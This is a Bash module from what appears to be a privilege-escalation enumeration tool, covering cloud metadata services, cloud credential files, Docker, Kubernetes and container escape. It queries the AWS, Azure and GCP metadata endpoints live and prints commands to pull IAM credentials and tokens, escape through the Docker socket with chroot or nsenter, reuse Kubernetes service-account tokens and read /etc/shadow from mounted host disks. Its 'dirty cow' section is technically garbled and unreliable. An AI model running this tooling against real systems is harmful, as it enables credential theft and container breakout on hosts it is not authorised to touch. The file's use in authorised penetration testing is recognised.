#!/bin/bash

source "$(dirname "${BASH_SOURCE[0]}")/../utils/helpers.sh"

check_cloud_metadata() {
    print_title "CLOUD METADATA SERVICES"
    
    print_info "Checking for cloud provider metadata services..."
    
    local metadata_found=false
    
    print_subtitle "AWS EC2 Metadata:"
    if [[ -n "$CURL_CMD" ]]; then
        local aws_response=$($CURL_CMD -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/ 2>/dev/null)
        if [[ -n "$aws_response" ]]; then
            print_high "AWS EC2 metadata service available!"
            metadata_found=true
            
            print_info "Available metadata endpoints:"
            echo "$aws_response" | head -20
            
            print_subtitle "Sensitive AWS metadata:"
            print_command "# Get IAM role"
            print_command "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
            print_command ""
            print_command "# Get credentials"
            print_command "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>"
            
            [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "cloud" "high" "AWS EC2 metadata accessible" "Can retrieve IAM credentials" "N/A"
        fi
    fi
    
    print_subtitle "Azure Metadata:"
    if [[ -n "$CURL_CMD" ]]; then
        local azure_response=$($CURL_CMD -s --connect-timeout 2 -H "Metadata: true" http://169.254.169.254/metadata/instance 2>/dev/null)
        if [[ -n "$azure_response" ]]; then
            print_high "Azure metadata service available!"
            metadata_found=true
            
            [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "cloud" "high" "Azure metadata accessible" "Can retrieve instance metadata" "N/A"
            
            print_subtitle "Exploitation:"
            print_command "# Get access token"
            print_command "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com/'"
        fi
    fi
    
    print_subtitle "GCP Metadata:"
    if [[ -n "$CURL_CMD" ]]; then
        local gcp_response=$($CURL_CMD -s --connect-timeout 2 -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/ 2>/dev/null)
        if [[ -n "$gcp_response" ]]; then
            print_high "GCP metadata service available!"
            metadata_found=true
            
            [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "cloud" "high" "GCP metadata accessible" "Can retrieve instance metadata" "N/A"
            
            print_subtitle "Exploitation:"
            print_command "# Get service account"
            print_command "curl -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/'"
        fi
    fi
    
    if [[ "$metadata_found" == "false" ]]; then
        print_info "No cloud metadata services detected"
    fi
    
    echo ""
}

check_cloud_files() {
    print_title "CLOUD CONFIGURATION FILES"
    
    print_info "Searching for cloud provider credentials..."
    
    print_subtitle "AWS credentials:"
    local aws_files=(".aws/credentials" ".aws/config" "aws/credentials" "aws/config")
    for file in "${aws_files[@]}"; do
        local full_path="$HOME/$file"
        if [[ -f "$full_path" ]]; then
            print_high "AWS credentials found: $full_path"
            [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "cloud" "critical" "AWS credentials found" "$full_path" "Use AWS CLI with credentials"
        fi
    done
    
    print_subtitle "Azure credentials:"
    local azure_files=(".azure" "azure" ".azure/azureProfile.json" "azure/azureProfile.json")
    for file in "${azure_files[@]}"; do
        local full_path="$HOME/$file"
        if [[ -f "$full_path" ]]; then
            print_high "Azure credentials found: $full_path"
        fi
    done
    
    print_subtitle "GCP credentials:"
    local gcp_files=(".config/gcloud" ".gcloud" "gcloud" ".boto" "boto")
    for file in "${gcp_files[@]}"; do
        local full_path="$HOME/$file"
        if [[ -d "$full_path" ]]; then
            print_high "GCP credentials found: $full_path"
            [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "cloud" "critical" "GCP credentials found" "$full_path" "Use gcloud CLI with credentials"
        fi
    done
    
    print_subtitle "General cloud files:"
    print_command "find / -name \"*.pem\" -o -name \"*.key\" -o -name \"*cloud*\" 2>/dev/null | grep -v proc | head -20"
    
    echo ""
}

check_docker() {
    print_title "DOCKER CONTAINER ANALYSIS"
    
    print_info "Checking Docker configuration..."
    
    if is_in_docker; then
        print_warn "Running inside Docker container"
        
        print_subtitle "Container environment:"
        [[ -f /.dockerenv ]] && print_info "Docker env file exists"
        cat /proc/1/cgroup 2>/dev/null | grep -i docker | head -3
        
        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "container" "info" "Running in Docker container" "System is containerized" "N/A"
    fi
    
    print_subtitle "Docker socket:"
    if [[ -S /var/run/docker.sock ]]; then
        print_critical "Docker socket exposed!"
        print_warn "Container breakout may be possible"
        
        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "docker" "critical" "Docker socket exposed" "Can interact with Docker daemon" "N/A"
        
        print_subtitle "Docker socket exploitation:"
        print_command "# Mount host filesystem"
        print_command "docker run -v /:/host alpine chroot /host"
        print_command ""
        print_command "# Escape to host"
        print_command "docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -u -i -n -p"
        
    else
        print_info "Docker socket not found"
    fi
    
    print_subtitle "Docker group:"
    if groups 2>/dev/null | grep -q "docker"; then
        print_high "User is in docker group"
        print_warn "Can potentially use Docker to escalate privileges"
        
        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "docker" "high" "User in docker group" "Can manage Docker containers" "N/A"
    fi
    
    echo ""
}

check_kubernetes() {
    print_title "KUBERNETES CONFIGURATION"
    
    print_info "Checking Kubernetes configuration..."
    
    print_subtitle "Service account:"
    if [[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]]; then
        print_high "Kubernetes service account token found!"
        
        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "kubernetes" "high" "K8s service account accessible" "Can interact with Kubernetes API" "N/A"
        
        print_subtitle "Exploitation:"
        print_command "# If inside a pod"
        print_command "cat /var/run/secrets/kubernetes.io/serviceaccount/token"
        print_command ""
        print_command "# Use token with kubectl"
        print_command "export TOKEN=\$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
        print_command "kubectl --token=\$TOKEN --server=\$KUBERNETES_SERVICE_HOST:\$KUBERNETES_PORT get pods"
    fi
    
    print_subtitle "Kubeconfig:"
    local kubeconfig="$HOME/.kube/config"
    if [[ -f "$kubeconfig" ]]; then
        print_high "Kubeconfig file found: $kubeconfig"
        
        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "kubernetes" "high" "Kubeconfig file found" "$kubeconfig" "Use kubectl with config"
    fi
    
    print_subtitle "Kubernetes files:"
    print_command "find /etc/kubernetes -name \"*.conf\" 2>/dev/null | head -10"
    print_command "find /var/lib/kubelet -name \"*.conf\" 2>/dev/null | head -10"
    
    echo ""
}

check_container_escape() {
    print_title "CONTAINER ESCAPE TECHNIQUES"
    
    print_subtitle "Shared host namespaces:"
    print_command "# Check if container shares host namespaces"
    print_command "cat /proc/1/ns/net"
    print_command "cat /proc/1/ns/pid"
    print_command "ip addr"
    
    print_subtitle "Mounted host filesystems:"
    print_command "# Check for mounted sensitive paths"
    print_command "mount | grep -v proc | grep -v sys"
    print_command "cat /proc/mounts | grep -v \"^proc\\|^sys\""
    
    print_subtitle "Escape via mount:"
    if mount | grep -q "^/dev"; then
        print_warn "Host devices may be accessible"
        print_command "# Mount host device and access files"
        print_command "mount /dev/sda1 /mnt"
        print_command "cat /mnt/etc/shadow"
    fi
    
    print_subtitle "Escape via cgroups:"
    print_command "# If cgroups v1 controllers are accessible"
    print_command "ls -la /sys/fs/cgroup/"
    print_command "# Can potentially write to cgroup files for escape"
    
    print_subtitle "Escape via dirty cow (if kernel vulnerable):"
    print_command "# Mount root filesystem and modify passwd"
    print_command "mkdir /tmp/cow"
    print_command "mount -t proc none /tmp/cow"
    print_command "cd /tmp/cow"
    print_command "echo 'root::0:0:root:/tmp/cow:/bin/sh' > passwd"
    
    print_link "Container Escape Techniques" "https://book.hacktricks.wiki/en/container-escape/container-breakout-techniques.html"
    
    echo ""
}

check_container_tools() {
    print_title "CONTAINER MANAGEMENT TOOLS"
    
    print_info "Checking for container management tools..."
    
    local tools=("docker" "kubectl" "crictl" "nerdctl" "podman" "containerd" "runc" "cri-o")
    
    for tool in "${tools[@]}"; do
        if command -v "$tool" >/dev/null 2>&1; then
            print_info "$tool found: $(command -v $tool)"
            
            case "$tool" in
                docker)
                    if groups 2>/dev/null | grep -q docker; then
                        print_high "User in docker group - can use Docker"
                        [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "container" "high" "Docker access available" "User can run Docker commands" "N/A"
                    fi
                    ;;
                kubectl)
                    print_info "kubectl available - can manage K8s"
                    [[ "$OUTPUT_FORMAT" != "json" ]] && json_add_finding "kubernetes" "info" "kubectl available" "Can manage Kubernetes" "N/A"
                    ;;
            esac
        fi
    done
    
    echo ""
}

run_cloud_container_checks() {
    check_cloud_metadata
    check_cloud_files
    check_docker
    check_kubernetes
    check_container_escape
    check_container_tools
}
